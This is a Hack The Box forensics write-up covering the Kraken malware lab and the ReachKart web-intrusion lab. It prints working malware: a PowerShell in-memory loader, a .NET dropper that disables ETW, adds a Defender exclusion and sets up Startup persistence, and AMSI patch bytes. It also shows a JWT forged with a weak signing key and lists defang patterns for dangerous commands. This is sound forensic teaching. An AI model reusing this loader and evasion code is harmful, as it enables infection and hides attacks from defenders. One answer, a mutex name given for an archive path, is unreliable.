> Link HTB #2.1: https://hackmd.io/@bMGaKJbHSWqauGaKAUyYhA/rkRi7jwWGl

### XII. Kraken:
> - Link lab: https://app.hackthebox.com/sherlocks/Kraken?tab=play_sherlock
> - Đề bài:
![image](https://hackmd.io/_uploads/SJvZTlmKzg.png)

#### 1. What was the exact date and time the malicious file was executed by the user?
Using FTK Imager for this challenge, export `NTUSER.DAT` and analyse this file by Registry Expolorer:
![image](https://hackmd.io/_uploads/ByhB7Q4FMg.png)
`NTUSER.DAT\Software\Microsoft\Windows\Currentversion\Explorer\UserAssist\` includes the information about executed process:
![image](https://hackmd.io/_uploads/SkLd8mVYMx.png)
I think `wscript.exe` and `Ghost Toolbox` is so supscious, in this challenge, `wscript.exe` is the correct answer.

**Answer:** `2025-06-13 14:43:27`

#### 2. During the initial stage of execution, what is the name of the first file dropped by the malicious file?
When checking for `AppData\Local\Temp`:
![image](https://hackmd.io/_uploads/ryqGP44FGx.png)
It is a intermediate script file. The date created of this file is `2025-06-13 14:43:28`.

**Answer:** `temp_993805.bat`

#### 3. During the initial stage of execution, The malicious file performed in-memory patching of a critical security function by overwriting it with a 6-byte sequence that forces the function to return zero. What is this hexadecimal byte sequence?
- Export `temp_993805.bat` and read its content:
![image](https://hackmd.io/_uploads/rkYX5VNFMe.png)
This is an obfuscated script, run this below code to defuscate the `.bat` file: 
    ``` py
    import re
    import sys
    import base64
    import argparse
    from pathlib import Path

    WINDOWS_BUILTIN_VARS = {
        "userprofile", "appdata", "localappdata", "temp", "tmp", "windir",
        "systemroot", "systemdrive", "programdata", "programfiles",
        "programfiles(x86)", "path", "pathext", "computername", "username",
        "homedrive", "homepath", "public", "allusersprofile", "comspec",
        "processor_architecture", "os", "number_of_processors",
    }

    VAR_PATTERN = re.compile(r"%([a-zA-Z_][a-zA-Z0-9_]*)%")
    DELAYED_VAR_PATTERN = re.compile(r"!([a-zA-Z_][a-zA-Z0-9_]*)!")
    SET_PATTERN = re.compile(
        r'^\s*set\s+(?:"([a-zA-Z_][a-zA-Z0-9_]*)=([^"]*)"|([a-zA-Z_][a-zA-Z0-9_]*)=(.*))\s*$',
        re.IGNORECASE,
    )
    BASE64_BLOCK_PATTERN = re.compile(r"[A-Za-z0-9+/]{40,}={0,2}")

    DANGEROUS_COMMANDS = {
        r"\biex\b": "REM-DEFANGED-iex",
        r"\bInvoke-Expression\b": "REM-DEFANGED-Invoke-Expression",
        r"\bstart\s+/min\b": "REM-DEFANGED-start-min",
        r"\bcmd(\.exe)?\s*/c\b": "REM-DEFANGED-cmd-slash-c",
        r"\bpowershell(\.exe)?\b": "REM-DEFANGED-powershell",
    }

    def strip_junk_variables(text):
        defined_vars = {m.group(1) or m.group(3) for m in SET_PATTERN.finditer(text) if (m.group(1) or m.group(3))}
        defined_vars = {v.lower() for v in defined_vars}

        def repl(m):
            name = m.group(1)
            low = name.lower()
            if low in WINDOWS_BUILTIN_VARS or low in defined_vars: return m.group(0)
            return ""
        return VAR_PATTERN.sub(repl, text)

    def build_variable_map(text):
        var_map = {}
        for line in text.splitlines():
            m = SET_PATTERN.match(line)
            if m:
                key = (m.group(1) or m.group(3)).strip()
                val = (m.group(2) if m.group(1) else m.group(4)) or ""
                val = val.strip()
                var_map[key.lower()] = val
        return var_map

    def resolve_variables(text, var_map, max_passes=10):
        def repl_percent(m):
            key = m.group(1).lower()
            return var_map.get(key, m.group(0))

        def repl_bang(m):
            key = m.group(1).lower()
            return var_map.get(key, m.group(0))

        for _ in range(max_passes):
            new_text = VAR_PATTERN.sub(repl_percent, text)
            new_text = DELAYED_VAR_PATTERN.sub(repl_bang, new_text)
            if new_text == text: break
            text = new_text
        return text

    def try_base64_decode(candidate):
        padded = candidate + "=" * (-len(candidate) % 4)
        try: decoded_bytes = base64.b64decode(padded, validate=False)
        except Exception: return None

        for encoding in ("utf-16-le", "utf-8"):
            try:
                decoded = decoded_bytes.decode(encoding)
                printable = sum(c.isprintable() or c in "\r\n\t" for c in decoded)
                if len(decoded) > 0 and printable / len(decoded) > 0.85: return decoded
            except Exception: continue
        return None

    def extract_and_decode_payloads(text, depth=0, max_depth=5):
        results = []
        if depth >= max_depth: return results
        for match in BASE64_BLOCK_PATTERN.finditer(text):
            candidate = match.group(0)
            decoded = try_base64_decode(candidate)
            if decoded:
                results.append(decoded)
                results.extend(extract_and_decode_payloads(decoded, depth + 1, max_depth))
        return results

    def defang(text):
        for pattern, replacement in DANGEROUS_COMMANDS.items(): text = re.sub(pattern, replacement, text, flags=re.IGNORECASE)
        return text

    def deobfuscate(file_path):
        raw = file_path.read_text(encoding="utf-8", errors="ignore")

        stripped = strip_junk_variables(raw)
        var_map = build_variable_map(stripped)
        resolved = resolve_variables(stripped, var_map)
        payloads = extract_and_decode_payloads(resolved)

        final_readable = defang(resolved + "\n" + "\n".join(payloads))
        return final_readable

    def main():
        parser = argparse.ArgumentParser()
        parser.add_argument("input_file")
        parser.add_argument("-o", "--output")
        args = parser.parse_args()

        in_path = Path(args.input_file)
        if not in_path.exists():
            print(f"[LỖI] Không tìm thấy file: {in_path}", file=sys.stderr)
            sys.exit(1)

        out_path = Path(args.output) if args.output else in_path.with_name(in_path.stem + "_final.txt")

        result = deobfuscate(in_path)
        out_path.write_text(result, encoding="utf-8")

        print(out_path)

    if __name__ == "__main__": main()
    ```
- In deobfucated script:
![image](https://hackmd.io/_uploads/HJRFOH4KGl.png)
These bytes is Assembly code x86/x64:
    - `B8 00 00 00 00`: `mov eax, 0`
    - `C3`: `ret`
The script edits malware-scanning function to a function that always return `0` (similar to error code `AMSI_RESULT_CLEAN`). No matter how dangerous the payload is, AMSI always reports to Defender that it is safe.

**Answer:** `0xB8,0x0,0x00,0x00,0x00,0xC3`

#### 4. What is the name of the file responsible for dropping the second-stage PE Files? (2nd Stage)
In the first part of the script:
![image](https://hackmd.io/_uploads/S1Cp5KSKfg.png)
![image](https://hackmd.io/_uploads/ryg5zjYrtfl.png)

**Answer:** `dwm.bat`

#### 5. What is the SHA-1 hash of the PE file created during the infection process, not malicious on its own?
- Because `temp_993805.bat` was runned in PowerShell, try extracting `Microsoft-Windows-PowerShell%4Operational.evtx` to find some clues:
![image](https://hackmd.io/_uploads/Hy3cPtSYfg.png)
- We saw this malicious payload:
![image](https://hackmd.io/_uploads/rJFpvKHYfl.png)
    ``` c++
    $lywyupnniwjnwvw = $env:USERNAME;
    $xmjclwpvfnogfdf = "C:\Users\$lywyupnniwjnwvw\dwm.bat";

    if (Test-Path $xmjclwpvfnogfdf) {
        Write-Host "Batch file found: $xmjclwpvfnogfdf" -ForegroundColor Cyan;    
        $fileLines = [System.IO.File]::ReadAllLines($xmjclwpvfnogfdf, [System.Text.Encoding]::UTF8);    

        foreach ($line in $fileLines) {        
            if ($line -match '^::: ?(.+)$') {            
                Write-Host "Injection code detected in the batch file." -ForegroundColor Cyan;  

                try {                
                    $decodedBytes = [System.Convert]::FromBase64String($matches[1].Trim());                
                    $injectionCode = [System.Text.Encoding]::Unicode.GetString($decodedBytes);                
                    Write-Host "Injection code decoded successfully." -ForegroundColor Green;                
                    Write-Host "Executing injection code..." -ForegroundColor Yellow;                
                    Invoke-Expression $injectionCode;                
                    break;
                }             
                catch {
                    Write-Host "Error during decoding or executing injection code: $_" -ForegroundColor Red;
                };        
            };    
        };
    }

    else {      
        Write-Host "System Error: Batch file not found: $xmjclwpvfnogfdf" -ForegroundColor Red;    
        exit;
    };

    function gbpqucxrcfxcqcc($param_var) {	
        $aes_var=[System.Security.Cryptography.Aes]::Create();	
        $aes_var.Mode=[System.Security.Cryptography.CipherMode]::CBC;	
        $aes_var.Padding=[System.Security.Cryptography.PaddingMode]::PKCS7;	
        $aes_var.Key=[System.Convert]::FromBase64String('ImocNEnUZbHBmaXIBtoy7X3HCr9QsCDJAUlkq43qYFg=');	
        $aes_var.IV=[System.Convert]::FromBase64String('WCpQVGqc+E4SNHfKYV5jVQ==');	
        $decryptor_var=$aes_var.CreateDecryptor();	
        $return_var=$decryptor_var.TransformFinalBlock($param_var, 0, $param_var.Length);	
        $decryptor_var.Dispose();	
        $aes_var.Dispose();	
        $return_var;
    }

    function moegszljbtuuqty($param_var) {	
        $ktumygjgvoympdu=New-Object System.IO.MemoryStream(,$param_var);	
        $gbnacpxhbjvsoxa=New-Object System.IO.MemoryStream;	
        $hgxevehdevdhjst=New-Object System.IO.Compression.GZipStream($ktumygjgvoympdu, [IO.Compression.CompressionMode]::Decompress);	
        $hgxevehdevdhjst.CopyTo($gbnacpxhbjvsoxa);	
        $hgxevehdevdhjst.Dispose();	
        $ktumygjgvoympdu.Dispose();	
        $gbnacpxhbjvsoxa.Dispose();	
        $gbnacpxhbjvsoxa.ToArray();
    }

    function verjrjrqdodbnti($param_var,$param2_var) {	
        $nwfhmshprjnltdd=[System.Reflection.Assembly]::('daoL'[-1..-4] -join '')([byte[]]$param_var);	
        $nuiugsoliqzxjfz=$nwfhmshprjnltdd.EntryPoint;	
        $nuiugsoliqzxjfz.Invoke($null, $param2_var);
    }

    $host.UI.RawUI.WindowTitle = $xmjclwpvfnogfdf;
    $wfdeypelsakoqbr=[System.IO.File]::('txeTllAdaeR'[-1..-11] -join '')($xmjclwpvfnogfdf).Split([Environment]::NewLine);
    foreach ($iztnbpjgjpisvip in $wfdeypelsakoqbr) {	
        if ($iztnbpjgjpisvip.StartsWith(':: ')) {		
            $wxjuawmvyltbrba=$iztnbpjgjpisvip.Substring(3);		
            break;	
        }
    }

    $owlhnktitgnqaer=[string[]]$wxjuawmvyltbrba.Split('\');
    $eqmijlluxoedssc=moegszljbtuuqty (gbpqucxrcfxcqcc ([Convert]::FromBase64String($owlhnktitgnqaer[0])));
    $lktibmgovfhzxpq=moegszljbtuuqty (gbpqucxrcfxcqcc ([Convert]::FromBase64String($owlhnktitgnqaer[1])));
    verjrjrqdodbnti $eqmijlluxoedssc $null;
    verjrjrqdodbnti $lktibmgovfhzxpq (,[string[]] ('%*'));
    ```
    The above script will find and run lines starting with `:::` in `C:\Users\<username>\dwm.bat`. After running the hidden code, two PE files will be extracted (`$eqmijlluxoedssc`, `$lktibmgovfhzxpq`. One of the two files is clean, the rest file is malicious. Both of them is decoded by using AES-CBC and extract with GZip, then they are executed in memory.
- Rewrite the script to extract PE files and shed the file-executing:
    ``` py
    import base64
    import gzip
    import os
    from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
    from cryptography.hazmat.primitives import padding
    from cryptography.hazmat.backends import default_backend

    BATCH_FILE_PATH = r"C:\Users\Ha Nguyen\Desktop\CTF\Kraken\dwm.bat"
    OUTPUT_DIR = r"C:\Users\Ha Nguyen\Desktop\CTF\Kraken" 

    AES_KEY = base64.b64decode("ImocNEnUZbHBmaXIBtoy7X3HCr9QsCDJAUlkq43qYFg=")
    AES_IV = base64.b64decode("WCpQVGqc+E4SNHfKYV5jVQ==")

    def decrypt_aes(data: bytes) -> bytes:
        cipher = Cipher(algorithms.AES(AES_KEY), modes.CBC(AES_IV), backend=default_backend())
        decryptor = cipher.decryptor()
        decrypted_padded = decryptor.update(data) + decryptor.finalize()
        unpadder = padding.PKCS7(algorithms.AES.block_size).unpadder()
        decrypted_data = unpadder.update(decrypted_padded) + unpadder.finalize()
        return decrypted_data

    def decompress_gzip(data: bytes) -> bytes: return gzip.decompress(data)

    def main():
        if not os.path.exists(BATCH_FILE_PATH): return

        payload_line = ""
        with open(BATCH_FILE_PATH, 'r', encoding='utf-8', errors='ignore') as f:
            for line in f:
                if line.startswith(":: "):
                    payload_line = line[3:].strip()
                    break
    
        if not payload_line: return

        payloads = payload_line.split('\\')
        if len(payloads) != 2: return

        for index, b64_payload in enumerate(payloads):
            file_id = index + 1
            output_file = os.path.join(OUTPUT_DIR, f"payload{file_id}.exe")
        
            try:
                enc_bytes = base64.b64decode(b64_payload)
                dec_bytes = decrypt_aes(enc_bytes)
                pe_bytes = decompress_gzip(dec_bytes)
                with open(output_file, 'wb') as f: f.write(pe_bytes)
                print(output_file)
            
            except Exception as e: print(f"{file_id}: {e}")

    if __name__ == "__main__": main()
    ```
    ![image](https://hackmd.io/_uploads/HJChcXuKGg.png)
- Check the hash of these extract file:
    - `payload1.exe`:
    ![image](https://hackmd.io/_uploads/Sy68omdYfe.png)
    ![image](https://hackmd.io/_uploads/BkS4iQ_YGe.png)
    - `payload2.exe`:
    ![image](https://hackmd.io/_uploads/rkGj37_Yzg.png)
    ![image](https://hackmd.io/_uploads/Skbnhm_Ffl.png)
Maybe the malicious file is `payload2.exe`.

**Answer:** `339E27243DF24F2B8979E78711E396698F4F47CC`


#### 6. In the third stage, what is the name of the malicious encrypted file that is injected into memory?
Using ILSpy to read the script of `payload2.exe`:
``` c#
using System;
using System.Diagnostics;
using System.IO;
using System.IO.Compression;
using System.Management;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Security.Principal;
using System.Threading;
using System.Windows.Forms;

internal class ymhpfvjydiynirikxkjbhjxgo
{
	private static uint PAGE_EXECUTE_READWRITE = 64u;

	[DllImport("kernel32.dll")]
	private static extern IntPtr LoadLibrary(string lpFileName);

	[DllImport("kernel32.dll")]
	private static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

	[DllImport("kernel32.dll")]
	private static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);

	private static void Main(string[] args)
	{
		try
		{
			if (!isstartup_function_name(Console.Title))
			{
				installstartup_function_name(Console.Title);
			}
		}
		catch (Exception ex)
		{
			MessageBox.Show("Erro no Startup: " + ex.ToString());
			Process.GetCurrentProcess().Kill();
		}
		if (isadmin_function_name())
		{
			try
			{
				AddDefenderExclusionWMI("C:\\");
			}
			catch (Exception)
			{
			}
		}
		IntPtr hModule = LoadLibrary("ntdll.dll");
		IntPtr procAddress = GetProcAddress(hModule, "EtwEventWrite");
		byte[] array = ((IntPtr.Size == 8) ? new byte[1] { 195 } : new byte[3] { 194, 20, 0 });
		VirtualProtect(procAddress, (UIntPtr)(ulong)array.Length, PAGE_EXECUTE_READWRITE, out var lpflOldProtect);
		Marshal.Copy(array, 0, procAddress, array.Length);
		VirtualProtect(procAddress, (UIntPtr)(ulong)array.Length, lpflOldProtect, out lpflOldProtect);
		string text = "xxxxxxxxxxxxxxxxxxxxxxxxxxxx.exe";
		Assembly executingAssembly = Assembly.GetExecutingAssembly();
		string[] manifestResourceNames = executingAssembly.GetManifestResourceNames();
		foreach (string name in manifestResourceNames)
		{
			if (name == text || string.IsNullOrWhiteSpace(name) || (!name.EndsWith(".exe") && !name.EndsWith(".bat")))
			{
				continue;
			}
			try
			{
				File.WriteAllBytes(name, vrqddcyydhiirynxuyehnfyxf(name));
				File.SetAttributes(name, FileAttributes.Hidden | FileAttributes.System);
				new Thread((ThreadStart)delegate
				{
					Process.Start(name).WaitForExit();
					File.SetAttributes(name, FileAttributes.Normal);
					File.Delete(name);
				}).Start();
			}
			catch
			{
			}
		}
		byte[] rawAssembly = crsfrooabjsbguiyqspwoxwjl(wchsjzawpcmvznzpmsgdltejp(vrqddcyydhiirynxuyehnfyxf(text), Convert.FromBase64String("ALWIGeOnxudniHR2K4CNZmnaEZffXt6zKsRFoAM2/mA="), Convert.FromBase64String("JXYbOTuuz3cErOl30kAKhw==")));
		string[] array2 = new string[0];
		try
		{
			array2 = ((args.Length > 0) ? args[0].Split(' ') : new string[0]);
		}
		catch
		{
		}
		MethodInfo entryPoint = Assembly.Load(rawAssembly).EntryPoint;
		try
		{
			entryPoint.Invoke(null, new object[1] { array2 });
		}
		catch
		{
			entryPoint.Invoke(null, null);
		}
	}

	private static bool isstartup_function_name(string path)
	{
		return path.Contains(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData));
	}

	private static void installstartup_function_name(string batPath)
	{
		try
		{
			string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.Startup);
			if (!Directory.Exists(folderPath))
			{
				Directory.CreateDirectory(folderPath);
			}
			string path = $"{Guid.NewGuid().ToString().Substring(0, 4)}.bat";
			string text = Path.Combine(folderPath, path);
			if (!string.Equals(Path.GetFullPath(batPath), Path.GetFullPath(text), StringComparison.OrdinalIgnoreCase))
			{
				File.Copy(batPath, text, overwrite: true);
				Console.WriteLine("  Location: " + text);
			}
		}
		catch (Exception ex)
		{
			Console.WriteLine("  " + ex.Message);
		}
	}

	private static bool isadmin_function_name()
	{
		WindowsIdentity current = WindowsIdentity.GetCurrent();
		WindowsPrincipal windowsPrincipal = new WindowsPrincipal(current);
		return windowsPrincipal.IsInRole(WindowsBuiltInRole.Administrator);
	}

	private static void killnonelevatedbatinstances_function_name(string batPath)
	{
		try
		{
			string text = batPath.Replace("\\", "\\\\");
			string queryString = "SELECT ProcessId, CommandLine FROM Win32_Process WHERE CommandLine LIKE '%" + text + "%'";
			ManagementObjectSearcher managementObjectSearcher = new ManagementObjectSearcher(queryString);
			foreach (ManagementObject item in managementObjectSearcher.Get())
			{
				uint num = (uint)item["ProcessId"];
				try
				{
					Process processById = Process.GetProcessById((int)num);
					processById.Kill();
					Console.WriteLine("Closing: " + num);
				}
				catch
				{
				}
			}
		}
		catch (Exception ex)
		{
			Console.WriteLine("Error with: " + ex.Message);
		}
	}

	public static void AddDefenderExclusionWMI(string path)
	{
		ManagementScope managementScope = new ManagementScope("\\\\.\\root\\Microsoft\\Windows\\Defender");
		managementScope.Connect();
		ManagementClass managementClass = new ManagementClass(managementScope, new ManagementPath("MSFT_MpPreference"), null);
		ManagementBaseObject methodParameters = managementClass.GetMethodParameters("Add");
		methodParameters["ExclusionPath"] = new string[1] { path };
		managementClass.InvokeMethod("Add", methodParameters, null);
	}

	private static byte[] wchsjzawpcmvznzpmsgdltejp(byte[] input, byte[] key, byte[] iv)
	{
		using AesManaged aesManaged = new AesManaged();
		aesManaged.Mode = CipherMode.CBC;
		aesManaged.Padding = PaddingMode.PKCS7;
		ICryptoTransform cryptoTransform = aesManaged.CreateDecryptor(key, iv);
		return cryptoTransform.TransformFinalBlock(input, 0, input.Length);
	}

	private static byte[] crsfrooabjsbguiyqspwoxwjl(byte[] bytes)
	{
		using MemoryStream stream = new MemoryStream(bytes);
		using MemoryStream memoryStream = new MemoryStream();
		using (GZipStream gZipStream = new GZipStream(stream, CompressionMode.Decompress))
		{
			gZipStream.CopyTo(memoryStream);
		}
		return memoryStream.ToArray();
	}

	private static byte[] vrqddcyydhiirynxuyehnfyxf(string name)
	{
		Assembly executingAssembly = Assembly.GetExecutingAssembly();
		using MemoryStream memoryStream = new MemoryStream();
		using (Stream stream = executingAssembly.GetManifestResourceStream(name))
		{
			stream.CopyTo(memoryStream);
		}
		return memoryStream.ToArray();
	}
}
```
The above .NET Dropper/Loader script used to maintain and destroy the system and continue to add another malicious script to the memory:
- Firstly, it checks whether it is running from `AppData` folder, if not, it copies itself, as a `.bat` file, to `Startup` folder. After that, Windows Defender is turned off by WMI (`AddDefenderExclusionWMI`). If the malware runs as an administrator, WMI is called to turn `C:\` into exclusion folder. Consequently, Windows Defender is "blind" because it cannot scan any files in `C:\`. This technique is similar to memory-patching in stage 1.
- In the next step, it runs `for` loop to scan all the resources embedded in this `payload2.exe`. If there has any `.exe` or `.bat` file (but `xxxxxxxxxxxxxxxxxxxxxxxxxxxx.exe`), they are set to be hidden and after being running, they are automatically deleted to wipe all traces.
- Similar to the previous PowerShell script, this malware hides the last PE file in `xxxxxxxxxxxxxxxxxxxxxxxxxxxx.exe`. It calls `wchsjzawpcmvznzpmsgdltejp` function to decode this resources with other new key and IV. After being extracted by GZip, it runs `Assembly.Load(rawAssembly).EntryPoint.Invoke(...)` to add and activate the malicious script directly in the memory of current process.
- Finally, a file is dropped to `Startup` folder (because of the API `Environment.SpecialFolder.Startup`).

![image](https://hackmd.io/_uploads/BJZ4gE_YMl.png)

**Answer:** `xxxxxxxxxxxxxxxxxxxxxxxxxxxx.exe`

#### 7. What encryption key and initialization vector (IV) were used to decrypt the file prior to memory injection?
In the above script of `payload2.exe`:
![image](https://hackmd.io/_uploads/BJwTrNuKze.png)

**Answer:** `ALWIGeOnxudniHR2K4CNZmnaEZffXt6zKsRFoAM2/mA=,JXYbOTuuz3cErOl30kAKhw==`

#### 8. What is the SHA-1 hash of that file after decryption?
- Extract `xxxxxxxxxxxxxxxxxxxxxxxxxxxx.exe` and save as `encrypted_resource.bin`:
![image](https://hackmd.io/_uploads/BJKU1ruKMl.png)
![image](https://hackmd.io/_uploads/BJIcyS_tGg.png)
- Run the below code to extract the last PE file:
    ``` py
    import base64
    import gzip
    import os
    from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
    from cryptography.hazmat.primitives import padding
    from cryptography.hazmat.backends import default_backend

    INPUT_FILE = r"C:\Users\Ha Nguyen\Desktop\CTF\Kraken\encrypted_resource.bin"
    OUTPUT_FILE = r"C:\Users\Ha Nguyen\Desktop\CTF\Kraken\payload3.exe"
    AES_KEY = base64.b64decode("ALWIGeOnxudniHR2K4CNZmnaEZffXt6zKsRFoAM2/mA=")
    AES_IV = base64.b64decode("JXYbOTuuz3cErOl30kAKhw==")

    def decrypt_aes(data: bytes) -> bytes:
        cipher = Cipher(algorithms.AES(AES_KEY), modes.CBC(AES_IV), backend=default_backend())
        decryptor = cipher.decryptor()
        decrypted_padded = decryptor.update(data) + decryptor.finalize()
        unpadder = padding.PKCS7(algorithms.AES.block_size).unpadder()
        decrypted_data = unpadder.update(decrypted_padded) + unpadder.finalize()
        return decrypted_data

    def main():
        if not os.path.exists(INPUT_FILE): return

        try:
            with open(INPUT_FILE, 'rb') as f: encrypted_data = f.read()
            decrypted_data = decrypt_aes(encrypted_data)
            final_pe_data = gzip.decompress(decrypted_data)
            with open(OUTPUT_FILE, 'wb') as f: f.write(final_pe_data)
        
        except Exception as e: print(e)

    if __name__ == "__main__": main()
    ```
- Check for the hash of extracted file:
![image](https://hackmd.io/_uploads/Bk3QZS_YGx.png)
![image](https://hackmd.io/_uploads/Hyp8bHdFze.png)

**Answer:** `052C0687F023564A3C31FB652BEA3405341272CB`

#### 9. There are 3 user agent strings in that PE File, what is the one related to the Mobile Device?
Using ILSpy to analyse `payload3.exe`, in class `Concentrate`:
![image](https://hackmd.io/_uploads/S14DktYtGl.png)
The whole line is:
``` c#
private static readonly string[] Parenting = new string[3] { "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:66.0) Gecko/20100101 Firefox/66.0", "Mozilla/5.0 (iPhone; CPU iPhone OS 11_4_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/11.0 Mobile/15E148 Safari/604.1", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36" };
```
**Answer:** `Mozilla/5.0 (iPhone; CPU iPhone OS 11_4_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/11.0 Mobile/15E148 Safari/604.1`

#### 10. Once the attacker gained root access on the system, they began preparing for data exfiltration. Data was staged and compressed before being exfiltrated outside the network. What is the full path of the archive file?
Using `Ctrl` + `F` to find the keyword `mutex`, in class `Concentrate`:
![image](https://hackmd.io/_uploads/rJe0WYFYGg.png)
And in class `Louisiana`:
![image](https://hackmd.io/_uploads/Bk0z4YFtMl.png)
As we can see:
- `new Mutex()` is the function to create a new Mutex objective.
- `Louisiana.Territories =` is the Mutex objective that is created and stored into `Territories` variable (this variable belongs to class `Louisiana`).
- `public static Mutex Territories`: This is the official statement to confirm that `Territories` is a variable having data type `Mutex`.

**Answer:** `Territories`

#### 11. What is the ip address and port number that C2 file connects to during that time?
- In class `Concentrate`:
![image](https://hackmd.io/_uploads/rkFZDFFtfe.png)
The IP address or C2 Domain name is store in `Incorporate` variable and the port number is stored in `Contributing` variable.
- Filter the keyword `Incorporate`, in class `Characterized`:
![image](https://hackmd.io/_uploads/BkOVuKKKGg.png)
So we have to look for `array[1]` and `array[2]`.
- In the same class, I see this line:
![image](https://hackmd.io/_uploads/SknfFtKFMl.png)
    - `Concentrate.Mauritius(Configured)`: Pass `Configured` variable to function `Mauritius` to decrypt.
    - `Concentrate.Instrumental()`: Transfer the decrypted byte array to a readable string.
    - `Strings.Split(..., Conversions.ToString(Negotiations))`: Divide the above long configuration string into smaller parts and pass to `array`.
- When I trace all the things that related to `array`, I find that all of them point to class `Louisiana`. In this class:
![image](https://hackmd.io/_uploads/ryY32KtYGe.png)
The domain is `apostlejob3.duckdns.org` and its port is `2468`.
- Search for this domain on NsLookup.io:
![image](https://hackmd.io/_uploads/rkbVAtKKfx.png)
The IP address is `107.172.232.84`.

**Answer:** `107.172.232.84:2468`

#### 12. A persistence file was dropped to maintain access for the attacker. What is the full path of this file?
In the third stage, we have `installstartup_function_name` function in the script of `payload2.exe`:
![image](https://hackmd.io/_uploads/HJm1-9tKMe.png)
We all know that the dropped file is in `Startup` folder. Go to this folder:
![image](https://hackmd.io/_uploads/B1U8M9FFfx.png)

**Answer:** `C:\Users\Administrator\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\5c74.bat`

### XIII. ReachKart:
> - Link lab: https://app.hackthebox.com/sherlocks/ReachKart?tab=play_sherlock
> - Đề bài:
> ![image](https://hackmd.io/_uploads/BJVy-hIqzl.png)

#### 1. What was the vulnerable endpoint that allowed the attacker to leak files?
In `access.log`, I saw a sign of Path Traversal:
![image](https://hackmd.io/_uploads/SypIG28cMl.png)
It came from `/user/getOrderBill` endpoint.

**Answer:** `/user/getOrderBill`

#### 2. When was the first successful exploitation of the vulnerable endpoint by the attacker (time in UTC)?
I saw that server reply a respond whose code is `200 OK`:
![image](https://hackmd.io/_uploads/SJfHwnLqMl.png)

**Answer:** `2025-03-01 04:09:22`

#### 3. Which version of Express is currently being used on the server?
In `.pcap`, filter packets whose protocol is HTTP. There has a packet that attacker successfully exploit to `package.json`:
![image](https://hackmd.io/_uploads/SJ-HF2I5Mx.png)
Check its HTTP Stream:
![image](https://hackmd.io/_uploads/ryGvK385ze.png)

**Answer:** `4.21.2`

#### 4. Which Ethereum compatible development smart contract network is running on the server? (Format: name@version)
In `package.json`:
![image](https://hackmd.io/_uploads/SyLKlgO5fg.png)

**Answer:** `hardhat@2.22.18`

#### 5. What is the signing key used by the server to sign JSON Web Tokens (JWT)?
- Check for the following packet:
![image](https://hackmd.io/_uploads/rkFDfl_qMx.png)
I saw this line:
![image](https://hackmd.io/_uploads/ryG2Mxu9fx.png)
The key was read from `reachkart.key`. But when finding this file to export, I saw nothing:
![image](https://hackmd.io/_uploads/SkIvQld9Gg.png)
![image](https://hackmd.io/_uploads/BJyW7xuqze.png)
- Try to check HTTP Stream of the next packet:
![image](https://hackmd.io/_uploads/H17nQxucGx.png)
I saw this:
![image](https://hackmd.io/_uploads/BJA0Xgu9fg.png)
This line means that if there has a `SECRET_KEY` set on the system, use it. If not, use `SuperSecretPassword`.

**Answer:** `SuperSecretPassword`


#### 6. The attacker was able to generate a JWT from the signing key and log in to the admin panel. What is the JWT value?
Because attacker logged into the admin panel, check for HTTP Stream of this packet:
![image](https://hackmd.io/_uploads/rJ4JUxdcGg.png)
I saw this token:
![image](https://hackmd.io/_uploads/HJxLUxd5Gg.png)
Attacker successfully logged into `/admin/home`.

**Answer:**
```
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJuYW1lIjoiRGFydGggVmFkZXIiLCJlbWFpbCI6ImRhcnRodmFkZXJAZW1waXJlLmNvbSIsImFjY291bnRfdHlwZSI6ImFkbWluIiwiaWF0IjoxNzQwODAyNzM0LCJleHAiOjE3NDA4ODkxMzR9.RBmMEC7IYmkzz1LsT-kP_JkLCUb7-hsJKX4IdjE91TE
```

#### 7. Decode the token and find the email used by the attacker to log in to the admin panel.
Go back to this packet and check for its HTTP Stream:
![image](https://hackmd.io/_uploads/r1tCYe_cMe.png)
There has a function used to generate a JWT Token:
![image](https://hackmd.io/_uploads/BkqWixd9zl.png)
Export `reachkart.db` and check for this database:
![image](https://hackmd.io/_uploads/SJnLTxdqMg.png)
![image](https://hackmd.io/_uploads/HkpOTeO9fl.png)
Check the `user` table:
![image](https://hackmd.io/_uploads/S1Yp6gdcfl.png)
I don't know how to get the email from a token, but I found this link: https://jwt.io. So, copy the above token past to this URL:
![image](https://hackmd.io/_uploads/SkY90x_qMx.png)
And I get the attacker's email.

**Answer:** `darthvader@empire.com`

#### 8. The admin panel uses WebSocket to send and receive terminal input. What port is being used?
We know that attacker successfully logged to Admin Panel:
![image](https://hackmd.io/_uploads/SJiGWW_5Mx.png)
Check for the HTTP Stream of the packet no. 1288:
![image](https://hackmd.io/_uploads/S1oIWWuqfg.png)

**Answer:** `8888`

#### 9. The attacker then was able to retrieve a sensitive file. When did the attacker get the file (UTC)?
Check for the flow of HTTP packets:
![image](https://hackmd.io/_uploads/rJj7GW_qGx.png)
After send and receive terminal input, attacker tried getting some files in `/log`, but failed. Then, attacker successfully get a database file, it is `reachkart.db` that I exported before.

**Answer:** `2025-03-01 04:22:01`

#### 10. What is the SHA-256 hash of the file that the attacker downloaded?
Check for its SHA-256 hash in PowerShell:
![image](https://hackmd.io/_uploads/BJgrmZucfx.png)

**Answer:** `fabe3234bb709ee5e5c5c2789c891a9a49368ffa520b23d60f6be2f2ca81bac6`

#### 11. How many sellers are there in the e-commerce website?
I will do a query to find the number of sellers in `users` table:
![image](https://hackmd.io/_uploads/B1y-E-O5fl.png)
![image](https://hackmd.io/_uploads/BJR7EZOcGg.png)
There are eight sellers.

**Answer:** `8`

#### 12. The attacker started sending Ether from all identified sellers' wallets. What is the hash of the first transaction?
Filter packets that contains the information of attacker's sending behaviour:
![image](https://hackmd.io/_uploads/HJ1ZPWuqze.png)
